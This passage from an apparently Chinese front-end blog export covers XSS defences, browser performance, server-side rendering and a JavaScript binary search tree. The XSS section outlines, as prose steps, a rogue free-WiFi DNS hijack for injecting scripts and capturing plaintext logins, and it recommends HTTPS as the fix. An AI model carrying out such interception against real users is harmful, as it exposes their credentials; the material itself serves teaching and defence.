<p><code>结论：</code><br>后端尽可能对提交的数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。<br><code>开发安全措施：</code></p>
<ul>
<li>1、首要是服务端要进行过滤，因为前端的校验可以被绕过。</li>
<li>2、当服务端不校验的时候，前端要以各种方式过滤里面可能的恶意脚本，例如<code>script</code>标签，将特殊字符转化成<code>HTML</code>编码。</li>
</ul>
<h2 id="DOM-based-or-local-XSS"><a href="#DOM-based-or-local-XSS" class="headerlink" title="DOM-based or local XSS"></a>DOM-based or local XSS</h2><p>基于DOM或者本地的XSS攻击。一般是提供免费的<code>wifi</code>，但是提供免费<code>wifi</code>的网关会忘你访问的任何页面插入一段脚本或者直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的<code>XSS</code>攻击。<br><code>例子1：</code></p>
<ul>
<li>1、提供一个免费的<code>wifi</code></li>
<li>2、开启一个特殊的<code>DNS</code>服务，将所有域名都解析到我们的电脑上，并把<code>Wifi</code>的<code>DHCP-DNS</code>设置为我们的电脑<code>IP</code></li>
<li>3、之后脸上<code>wifi</code>的用户打开任何网站，请求都被我们截取到。我们根据<code>http</code>头中的<code>host</code>字段来转发到真正的服务器上。</li>
<li>4、收到服务器返回的数据之后，我们就可以网页脚本的注入，并返回给用户。</li>
<li>5、当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</li>
</ul>
<p><img src="/static/img/XSS-1.png" width="700"></p>
<p>这个其就是<code>wifi</code>流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。</p>
<p><code>例子2：</code></p>
<ul>
<li>1、还是提供一个免费<code>wifi</code></li>
<li>2、在我们电脑上抓包</li>
<li>3、分析数据，可以获取用户的微信朋友圈、邮箱、社交网站账号数据（HTTP）等。</li>
</ul>
<p><img src="/static/img/XSS-2.png" width="700"></p>
<p>PS：这个是我的测试，在51job页面登录时进行抓包，可以获取账号密码。<br><code>结论：</code><br>这攻击其实跟网站本身没什么联系，只是数据被中间人获取而已，而由于<code>HTTP</code>是明文传输的，所以是极可能被且与的。<br><code>开发安全措施：</code></p>
<ul>
<li>1、使用<code>HTTPS</code>，<code>HTTPS</code>会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了也是加密后的数据。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>XSS</code>攻击的特点就是：尽一切办法在目标网站上执行非目标网站的脚本。本地的<code>XSS</code>攻击的<code>示例2</code>其实不算<code>XSS</code>攻击，只是简单的流量劫持。前两种<code>XSS</code>攻击是我们开发时要注意的，而流量劫持的则可以使用<code>HTTPS</code>提高安全性。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>性能-H5性能优化整理</title>
    <url>/2018/04/17/%E6%80%A7%E8%83%BD_H5%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h2 id="H5-性能优化整理"><a href="#H5-性能优化整理" class="headerlink" title="H5 性能优化整理"></a>H5 性能优化整理</h2><h4 id="H5-性能指标"><a href="#H5-性能指标" class="headerlink" title="H5 性能指标"></a>H5 性能指标</h4><p>我认为 H5 的性能指标包含三个维度：</p>
<ul>
<li>完成首屏渲染的时间</li>
<li>渲染完成后用户的交互体验</li>
<li>应用的耗电情况</li>
</ul>
<p>针对第一点：<em>完成首屏渲染的时间</em>，一个好的网站，应该在 <code>2-4</code> 秒内完成渲染，即展示给用户。我们可以设立一个目标，比如3秒内完成首屏渲染。</p>
<p>针对第二点：<em>渲染完成后用户的交互体验</em>，H5 站点经常会有纯H5的交互组件，如模拟滚动、模拟Picker选择器等。这些组件的体验是否流畅，是否会出现卡顿等问题，也是严重影响用户体验的因素，需要我们考虑。</p>
<p>针对第三点：<em>应用的耗电量</em>，正如第二点所说，为了尽可能的避免卡顿，通常我们会启用3D硬件加速，但大面积的启用3D硬件加速会导致耗电量过大的问题，我们需要一个衡量变通的方案。</p>
<p>综上所述，我们要结合每一个性能指标，以及H5应用的实际场景，给出合理的优化方案，下面我们一个一个来谈。</p>
<h4 id="最小化完成首屏渲染的时间"><a href="#最小化完成首屏渲染的时间" class="headerlink" title="最小化完成首屏渲染的时间"></a>最小化完成首屏渲染的时间</h4><p>要缩短完成首屏渲染的时间，那我们必然需要知道一个问题，哪些因素会影响完成渲染的时间，首先网速是一个必不可少的关键因素，网速快资源下载的快，那么最终完成渲染的时间必然要短，反之亦然。除了网速，资源的大小也是一个重要考量因素，如果网速是固定的，那么当然资源越小越好。除此之外，浏览器解析代码渲染页面的过程也是需要时间的，我们要尽可能的优化我们的代码，如尽可能避免引起浏览器的 Reflow/Repaint 等。为此我推荐大家从以下一个关键因素优化：</p>
<h5 id="减小资源体积"><a href="#减小资源体积" class="headerlink" title="减小资源体积"></a>减小资源体积</h5><p>在弱网情况下如 2G/3G 网络，根据 chrome 浏览器开发者工具的 <code>Network</code> 中的限流控制，我们可以做出相应的衡量，如图：</p>
<p><img src="/static/img/net.png" width="700"></p>
<p>2G弱网的平均网速约为 300kb/s，3弱网的最差网速为 250kb/s，兼顾 2G/3G，我们可以去 250kb/s 为标准，那么想要在 3s 内完成渲染，资源的体积一定要小于 <code>250kb/s * 3s = 750kb</code>。</p>
<ul>
<li>压缩HTML、CSS、JavaScript，目前构建工具可以帮我们解决这个问题</li>
<li>压缩图片，(webP格式的图片要比同等质量的jpg图片小很多)</li>
</ul>
<h5 id="减少HTTP请求的数量"><a href="#减少HTTP请求的数量" class="headerlink" title="减少HTTP请求的数量"></a>减少HTTP请求的数量</h5><p>手机浏览器能同时响应请求的数量为 4-6 个（Android4个，IOS5后支持6个），首次加载的资源数量要在 4 个以内。</p>
<ul>
<li>合并JS、CSS资源</li>
<li>使用雪碧图</li>
</ul>
<h5 id="缓存静态资源"><a href="#缓存静态资源" class="headerlink" title="缓存静态资源"></a>缓存静态资源</h5><p>这个可能是对站点优化最为显著的优化措施了。具体的缓存方法和原理，可以查看：</p>
<ul>
<li><a href="/2018/04/17/网络_强缓存与协商缓存/">强缓存与协商缓存</a></li>
</ul>
<h5 id="关键路径优化"><a href="#关键路径优化" class="headerlink" title="关键路径优化"></a>关键路径优化</h5><p>可以查看：<a href="/2018/04/17/性能_数据直出与服务端渲染的首屏优化/">数据直出与服务端渲染的首屏优化</a></p>
<h5 id="按需加载"><a href="#按需加载" class="headerlink" title="按需加载"></a>按需加载</h5><p>如果页面的内容过多，我们是可以考虑只加载首屏的内容，其他内容等用户真正需要的时候再加载，比如滚动加载、懒加载等等。</p>
<h5 id="避免重定向"><a href="#避免重定向" class="headerlink" title="避免重定向"></a>避免重定向</h5><p>重定向严重影响资源的加载速度，一定要避免。</p>
<h4 id="渲染完成后用户的交互体验"><a href="#渲染完成后用户的交互体验" class="headerlink" title="渲染完成后用户的交互体验"></a>渲染完成后用户的交互体验</h4><p>待续……</p>
<h4 id="应用的耗电情况"><a href="#应用的耗电情况" class="headerlink" title="应用的耗电情况"></a>应用的耗电情况</h4><p>待续……</p>
]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>H5性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title>性能-数据直出与服务端渲染的首屏优化</title>
    <url>/2018/04/17/%E6%80%A7%E8%83%BD_%E6%95%B0%E6%8D%AE%E7%9B%B4%E5%87%BA%E4%B8%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B8%B2%E6%9F%93%E7%9A%84%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h2 id="数据直出与服务端渲染的首屏优化"><a href="#数据直出与服务端渲染的首屏优化" class="headerlink" title="数据直出与服务端渲染的首屏优化"></a>数据直出与服务端渲染的首屏优化</h2><p>在web开发初期，对于前端来讲，存在感是很小的，基本上是服务端给什么，前端就展示什么，这个时候一般以服务端MVC开发模式为主。前端浏览器单纯的展示由服务端吐出的数据。</p>
<p>随着技术的发展，ajax的出现改变了这一现状，使得SPA(单页应用)受到了极大的推崇，其实究其原因，就是因为ajax带来的用户感知友好。说白了就是能不刷新页面的就不要刷新。这个时候，逐渐形成了一套前后端分离的方案或开发模式，这套开发模式也使得前端和后端开发的解耦，一定程度上提升了开发效率。</p>
<p>而最近，似乎服务端渲染又被推崇了起来。其实无论是前后端分离也好，服务端渲染也罢，我们最终的目的只有一个：让应用的性能更佳，让用户的体验更好。</p>
<p>这篇文章就从应用的加载已经渲染的过程，谈谈服务端渲染对应用的优化。</p>
<h4 id="纯前后端分离的做法"><a href="#纯前后端分离的做法" class="headerlink" title="纯前后端分离的做法"></a>纯前后端分离的做法</h4><p>用一张图来表示纯前后端分离的做法：</p>
<p><img src="/static/img/spa.png" width="500"></p>
<p>基本分成五个步骤，解释如下：</p>
<ul>
<li>一：首先浏览器要向从服务器获取html页面，然后浏览器开始解析页面。</li>
<li>二：通常在解析页面的时候，在html标签的头部会遇到 <code>&lt;link&gt;</code> 的CSS资源，这个时候可能会向CDN加载CSS资源。</li>
<li>三：遇到页面底部的js资源，同样要加载js资源。</li>
<li>四：要等到js资源加载完成后，才能够通过ajax请求服务端的接口，获取数据。</li>
<li>五：当取到数据之后，渲染页面。</li>
</ul>
<p>首先，我们分析一下这个过程，至少要发送四次http请求才能开始渲染页面：</p>
<ul>
<li>第一次：请求 html 页面</li>
<li>第二次：请求 css 资源（假设只有一个css资源需要加载）</li>
<li>第三次：请求 js 资源（假设只有一个js资源需要加载）</li>
<li>第四次：请求数据</li>
</ul>
<p>除了需要四次http请求之外，我们应该注意另外一件事，就是渲染页面的时机，是在第五步才开始进行的。那么这个过程有什么办法优化吗？答案是有的。</p>
<h4 id="数据直出"><a href="#数据直出" class="headerlink" title="数据直出"></a>数据直出</h4><p>在之前的那张图片中，我们可以清晰的看到，第一步请求 <code>html</code> 文件，第四步才能够请求数据，那么我们可不可以把第四步合并至第一步呢？换句话说，我们服务器在返回html内容的同时，把数据也一并返回，拼接到 html 字符串上，比如插入到 <code>body</code> 标签的自定义属性上，比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">data-render-data</span>=<span class="string">"&#123;boj:&#123;a: 1&#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样，我们在第四步判断如果服务器已经把数据给我们返回了，就不需要再请求数据了，即减少了一次 http 请求的开销，用一张图表示这个过程：</p>
<p><img src="/static/img/zhichu.png" width="500"></p>
<p>那么这样做的收益如何？其实等价于把外网发送的http数据请求该为了服务器内网对数据的请求，外网的网络环境相当不可控，甚至极其恶劣，但我们内网的速度极快且稳定。</p>
<h4 id="服务端渲染"><a href="#服务端渲染" class="headerlink" title="服务端渲染"></a>服务端渲染</h4><p>在上一小节数据直出中我们知道，服务端可以把html字符串和数据一并给我们返回，那么可不可以再进一步：服务端将html和数据进行渲染，将渲染好之后的html字符串吐给前端，直接展示，来看下面这张图：</p>
<p><img src="/static/img/ssr.png" width="500"></p>
<p>这样做和简单的数据直出有什么好处？答案是更快的展示首屏的内容给用户，原因如下：</p>
<p>简单的数据直出，要等到CSS和JS资源都加载完之后，才进行渲染展示。而ssr在第一步就以及渲染完成，只要CSS资源加载完就可以按照预定的样式展示了。这无疑会对展示的速度提升很多，甚至，如果CSS资源不大的话，我们可以考虑将CSS通过 <code>style</code> 标签内敛到html里，这样又减少了请求CSS资源的时间。</p>
<p>当然，这样考虑整体资源的大小，一般情况下，首屏加载的资源要小于1000kb。所以根据资源情况来决定采用什么样的措施。</p>
<p>目前，React 和 Vue 等主流的前端框架都已经支持服务端渲染（ssr），如果应用得当的话，是可以有效对首屏加载时间进行一定程度的优化的。</p>
]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>首屏优化</tag>
      </tags>
  </entry>
  <entry>
    <title>性能-重排和重绘的概念及触发条件</title>
    <url>/2018/04/17/%E6%80%A7%E8%83%BD_%E9%87%8D%E6%8E%92%E5%92%8C%E9%87%8D%E7%BB%98%E7%9A%84%E6%A6%82%E5%BF%B5%E5%8F%8A%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="重排和重绘"><a href="#重排和重绘" class="headerlink" title="重排和重绘"></a>重排和重绘</h2><h4 id="重排-reflow"><a href="#重排-reflow" class="headerlink" title="重排(reflow)"></a>重排(reflow)</h4><p class="tip">重新构造渲染树(Render Tree)的过程，叫做重排</p>

<p>当DOM元素的变化影响了几何属性（如：宽高、位置）时，浏览器需要重新计算元素的几何属性，同时其他元素的几何属性也可能受到影响，这个时候浏览器会使渲染树(Render Tree)中受影响的部分失效，并重新构造渲染树，这个过程叫重排。</p>
<blockquote>
<p>浏览器在构造渲染树的时候，通常只需要遍历一次</p>
</blockquote>
<h6 id="重排的触发时机"><a href="#重排的触发时机" class="headerlink" title="重排的触发时机"></a>重排的触发时机</h6><ul>
<li>添加、删除、替换DOM节点</li>
<li>改变DOM元素的位置、尺寸、内容</li>
<li>浏览器窗口大小发生改变</li>
<li>页面初次渲染</li>
</ul>
<h4 id="重绘-repaint"><a href="#重绘-repaint" class="headerlink" title="重绘(repaint)"></a>重绘(repaint)</h4><p>浏览器绘制变化的部分到屏幕叫重绘</p>
<p>元素的变化不一定触发重排，但一定触发重绘</p>
<h4 id="渲染树变化队列和刷新"><a href="#渲染树变化队列和刷新" class="headerlink" title="渲染树变化队列和刷新"></a>渲染树变化队列和刷新</h4><p>浏览器有自己的优化机制，即并不是每次变化都会触发重排，而是将变化缓冲在队列里，当变化达到一定数量后刷新变化队列，触发重排。但是我们在获取一下属性时，浏览器会强制更新变化队列触发重排，因为这些属性需要返回实时的值：</p>
<ul>
<li><p>offsetTop、offsetLeft、offsetWidth、offsetHeight</p>
</li>
<li><p>scrollTop、scrollLeft、scrollWidth、scrollHeight</p>
</li>
<li><p>clientTop、clientLeft、clientWidth、clientHeight</p>
</li>
<li><p>getComputeStyle()、currentStyle(IE)</p>
</li>
</ul>
<h4 id="性能优化（最小化重排和重绘）"><a href="#性能优化（最小化重排和重绘）" class="headerlink" title="性能优化（最小化重排和重绘）"></a>性能优化（最小化重排和重绘）</h4><p>在修改元素多种样式属性时，使用替换class名的方式 代替 使用js脚本逐个修改样式</p>
]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>重排重绘</tag>
      </tags>
  </entry>
  <entry>
    <title>性能-基础性能知识</title>
    <url>/2018/04/17/%E6%80%A7%E8%83%BD_%E5%9F%BA%E7%A1%80%E6%80%A7%E8%83%BD%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h2 id="尽量少用-innerHTML"><a href="#尽量少用-innerHTML" class="headerlink" title="尽量少用 innerHTML"></a>尽量少用 innerHTML</h2><ul>
<li>原因：因为 innerHTML 会调用一个沉重且高消耗的HTML解析器。</li>
</ul>
<h2 id="缓存DOM操作"><a href="#缓存DOM操作" class="headerlink" title="缓存DOM操作"></a>缓存DOM操作</h2><ul>
<li><code>NodeList</code> 或 <code>HTMLCollection</code> 由于这两个集合的实时性原因，每次访问此集合都会重新查询文档。这将导致性能问题，应该做缓存处理</li>
</ul>
<h2 id="JavaScript默认是同步解析的"><a href="#JavaScript默认是同步解析的" class="headerlink" title="JavaScript默认是同步解析的"></a>JavaScript默认是同步解析的</h2><ul>
<li>当DOM在解析时遇到 <code>&lt;script&gt;</code> 标签，将停止解析文档，并执行JavaScript脚本，如果是外部脚本，必须要下载后再解析，这将导致性能问题。</li>
</ul>
<h2 id="处理JavaScript事件时的性能问题"><a href="#处理JavaScript事件时的性能问题" class="headerlink" title="处理JavaScript事件时的性能问题"></a>处理JavaScript事件时的性能问题</h2><ul>
<li>过多的绑定事件处理函数，每个函数都是对象，都会占用内存</li>
<li>在绑定事件的时候务必要访问DOM元素，如果访问的过多，这也将导致性能问题</li>
<li>内存中留有废掉的事件处理函数：<ul>
<li>使用 removeChild() 或 replaceChild() 函数移除或替换节点时，如果被移除或替换的节点有绑定事件函数，那么该函数不会被当做垃圾回收。另外使用 innerHTML 替换DOM时也会出现这种情况</li>
</ul>
</li>
</ul>
<p>使用事件委托解决以上问题：减少DOM元素与事件函数的链接数，减少DOM访问次数，减少事件函数数量以减少内存占用。</p>
<h2 id="最小化重排和重绘"><a href="#最小化重排和重绘" class="headerlink" title="最小化重排和重绘"></a>最小化重排和重绘</h2><p>改变元素多种样式的时候，最好用className，一次性完成操作，这样只会修改一次DOM。</p>
<p><a href="/2018/04/17/性能_重排和重绘的概念及触发条件/">重排和重绘的概念及触发条件查看这里</a></p>
<h2 id="FOUC-无样式内容闪烁"><a href="#FOUC-无样式内容闪烁" class="headerlink" title="FOUC (无样式内容闪烁)"></a>FOUC (无样式内容闪烁)</h2><p>该问题主要出现在 IE 浏览器，原因有两个：</p>
<ul>
<li>1、使用@import方法导入CSS</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="keyword">@import</span> <span class="string">"../reset.css"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>IE</code> 加载HTML文档后，会先解析文档，然后再去加载由 <code>import</code> 导入的外部CSS文件，在CSS没有被加载的这段时间内，页面是无样式的。</p>
<ul>
<li>2、零散的添加样式引用</li>
</ul>
<p>将样式表链接放在页面不同位置时，在IE5/6下某些页面会无样式显示内容且瞬间闪烁，这现象就是文档样式短暂失效（Flash Of Unstyled Content），即FOUC。</p>
<p>解决方案：</p>
<ul>
<li>避免使用 <code>@import</code> 引入外部样式</li>
<li>将样式表引入放在 <code>&lt;head&gt;</code> 标签内</li>
</ul>
]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>基础性能</tag>
      </tags>
  </entry>
  <entry>
    <title>性能-浏览器渲染页面的过程</title>
    <url>/2018/04/17/%E6%80%A7%E8%83%BD_%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E9%A1%B5%E9%9D%A2%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="浏览器渲染页面的过程"><a href="#浏览器渲染页面的过程" class="headerlink" title="浏览器渲染页面的过程"></a>浏览器渲染页面的过程</h2><p>浏览器渲染页面的过程如下图：</p>
<p><img src="/static/img/render.png"></p>
<h4 id="一、解析HTML创建DOM-Tree"><a href="#一、解析HTML创建DOM-Tree" class="headerlink" title="一、解析HTML创建DOM Tree"></a>一、解析HTML创建DOM Tree</h4><p>浏览器解析HTML文档，并构造一颗DOM树(DOM Tree)</p>
<h4 id="二、解析CSS计算样式数据"><a href="#二、解析CSS计算样式数据" class="headerlink" title="二、解析CSS计算样式数据"></a>二、解析CSS计算样式数据</h4><p>浏览器构造DOM树的同时，还会解析CSS样式并计算最终的样式数据，生成样式规则。</p>
<h4 id="三、构造渲染树-Render-Tree"><a href="#三、构造渲染树-Render-Tree" class="headerlink" title="三、构造渲染树(Render Tree)"></a>三、构造渲染树(Render Tree)</h4><p>根据 <code>DOM Tree</code> 和 样式数据构造一颗渲染树(Render Tree)</p>
<p>渲染树会忽略不需要渲染的DOM元素（如：head标签、display值为none的元素）</p>
<h4 id="四、layout布局"><a href="#四、layout布局" class="headerlink" title="四、layout布局"></a>四、layout布局</h4><p>当渲染树构造完成后，浏览器会对渲染树进行布局，即分配固定的坐标点给DOM元素。</p>
<h4 id="五、paint绘制"><a href="#五、paint绘制" class="headerlink" title="五、paint绘制"></a>五、paint绘制</h4><p>布局完成后，浏览器将绘制最终的界面给用户</p>
]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>浏览器渲染过程</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-二叉树和二叉树查找</title>
    <url>/2018/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E4%BA%8C%E5%8F%89%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<h2 id="二叉树和二叉查找树"><a href="#二叉树和二叉查找树" class="headerlink" title="二叉树和二叉查找树"></a>二叉树和二叉查找树</h2><h4 id="树"><a href="#树" class="headerlink" title="树"></a>树</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>树是计算机科学中经常用到的一种数据结构，以分层的方式存储数据，所以经常用来存储具有层级关系的数据，比如文件系统。</p>
<p>此外，树也被用来存储有序的列表，例如二叉查找树，在二叉查找树上进行查找非常快。</p>
<h5 id="树的相关概念"><a href="#树的相关概念" class="headerlink" title="树的相关概念"></a>树的相关概念</h5><p>如下图，展示了有关树的术语：</p>
<p><img src="/static/img/tree.png" width="500"></p>
<p>上图描述了一个树，图中的每一个圆圈都是一个 <code>节点</code>，连接节点的线叫做 <code>边</code>。一棵树最上面的节点称为 <code>根节点</code>，如果一个节点下面连接多个节点，那么称该节点为 <code>父节点</code>，下面的节点为 <code>子节点</code>，没有子节点的节点称为 <code>叶子节点</code>。</p>
<p>从一个节点到与它不直接相连的节点的这一组边称为 <code>路径</code>，如图中(23-17-19)。</p>
<p>树可以分为几个层次，根节点是第0层，根节点的子节点是第1层，子节点的子节点是第2层，以此类推。层的数量代表了树的 <code>深度</code>。</p>
<p>任何一层的节点，都可以看做是子树的根。</p>
<h4 id="二叉树和二叉查找树-1"><a href="#二叉树和二叉查找树-1" class="headerlink" title="二叉树和二叉查找树"></a>二叉树和二叉查找树</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>子节点的数量不超过2个的树称为 <code>二叉树</code>。</p>
<h5 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h5><p>二叉树是一种特殊的树，二叉树中的任何一个节点的子节点的数量最多为2个，我们分别称这两个节点为 <code>左节点</code> 和 <code>右节点</code>。</p>
<p>通过把节点的数量限定为2，可以写出高效的程序在树种插入，查找，删除。</p>
<h5 id="二叉查找树"><a href="#二叉查找树" class="headerlink" title="二叉查找树"></a>二叉查找树</h5><p>二叉查找树是一种特殊的二叉树。相对较小的值存储在左节点中，较大的值存储在右节点中，这一特性使得查找效率非常高。</p>
<h4 id="实现二叉查找树"><a href="#实现二叉查找树" class="headerlink" title="实现二叉查找树"></a>实现二叉查找树</h4><h5 id="插入节点"><a href="#插入节点" class="headerlink" title="插入节点"></a>插入节点</h5><p>树是由节点组成的，所以我们需要一个节点类（Node）：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Node</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data = data</span><br><span class="line">    <span class="keyword">this</span>.left = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">this</span>.right = <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每个节点除了保存自身的数据之外，还保存着对子节点的引用(left/right)。</p>
<p>之后我们就可以构建二叉查找树了，假设我们的二叉查找树类是 <code>Bst</code>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Bst</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.root = <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入节点</span></span><br><span class="line">BST.prototype.insert = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Bst</code> 类在初始状态保存着整个二叉查找树的根节点(root)，<code>Bst</code> 拥有一个用来插入节点的方法：<code>insert</code>，接收节点的数据，并插入相应的位置，根据二叉查找树的特性：较小的值存放在左节点中，较大的值存放在右节点中，所以 <code>insert</code> 算法如下：</p>
<ul>
<li>1、根据输入的数据 <code>data</code> 创建一个新的节点。</li>
<li>2、检查是否有根节点，如果没有根节点证明这是一颗新树，将该节点作为跟节点。</li>
<li>3、否则，开始遍历树，将根节点设为当前节点，使用新节点与当前节点作比较，如果新节点的值小于当前节点。<ul>
<li>3.1、如果当前节点的左子节点为null，则将新节点设为当前节点的左子节点，退出循环。</li>
<li>3.2、如果当前节点的左子节点不为null，则更新当前节点为当前节点的左子节点，执行下一次循环。</li>
</ul>
</li>
<li>4、如果新节点的值大于当前节点。<ul>
<li>4.1、如果当前节点的右子节点为null，则将新节点设为当前节点的右子节点，退出循环。</li>
<li>4.2、如果当前节点的右子节点不为null，则更新当前节点为当前节点的右子节点，执行下一次循环。</li>
</ul>
</li>
</ul>
<p>根据上面的算法，我们可以写出如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">BST.prototype.insert = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="keyword">new</span> Node(data)</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.root) &#123;</span><br><span class="line">        <span class="keyword">this</span>.root = n</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.root</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (data &lt; current.data) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!current.left) &#123;</span><br><span class="line">                current.left = n</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            current = current.left</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!current.right) &#123;</span><br><span class="line">                current.right = n</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            current = current.right</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="遍历树"><a href="#遍历树" class="headerlink" title="遍历树"></a>遍历树</h5><p>由于二叉查找树的性质，较小的值存放在左边，较大的值存放在右边，所以通过对树的遍历，我们很容易实现按照特定的顺序显示数据，比如数字从小到大，字母的先后顺序等。</p>
<p>遍历二叉查找树的方式有三种：中序、先序、后序，代码实现起来很简单，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中序</span></span><br><span class="line">BST.prototype.inOrder = <span class="function"><span class="keyword">function</span> (<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        <span class="keyword">this</span>.inOrder(node.left)</span><br><span class="line">        <span class="built_in">console</span>.log(node.data)</span><br><span class="line">        <span class="keyword">this</span>.inOrder(node.right)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 先序</span></span><br><span class="line">BST.prototype.preOrder = <span class="function"><span class="keyword">function</span> (<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(node.data)</span><br><span class="line">        <span class="keyword">this</span>.preOrder(node.left)</span><br><span class="line">        <span class="keyword">this</span>.preOrder(node.right)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 后序</span></span><br><span class="line">BST.prototype.postOrder = <span class="function"><span class="keyword">function</span> (<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        <span class="keyword">this</span>.postOrder(node.left)</span><br><span class="line">        <span class="keyword">this</span>.postOrder(node.right)</span><br><span class="line">        <span class="built_in">console</span>.log(node.data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们使用如下代码来测试以上遍历的实现：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tree = <span class="keyword">new</span> Bst()</span><br><span class="line">tree.insert(<span class="number">23</span>)</span><br><span class="line">tree.insert(<span class="number">45</span>)</span><br><span class="line">tree.insert(<span class="number">16</span>)</span><br><span class="line">tree.insert(<span class="number">37</span>)</span><br><span class="line">tree.insert(<span class="number">3</span>)</span><br><span class="line">tree.insert(<span class="number">99</span>)</span><br><span class="line">tree.insert(<span class="number">22</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'=====中序====='</span>)</span><br><span class="line">tree.inOrder(tree.root)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'=====先序====='</span>)</span><br><span class="line">tree.preOrder(tree.root)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'=====后序====='</span>)</span><br><span class="line">tree.postOrder(tree.root)</span><br></pre></td></tr></table></figure>
<p>可以在控制台看到中序、先序、后序的遍历顺序分别为：</p>
<p><img src="/static/img/bianli.png" width="700"></p>
<h5 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h5><p>二叉查找树的查找分为：</p>
<ul>
<li>查找最小值</li>
<li>查找最大值</li>
<li>查找给定值</li>
</ul>
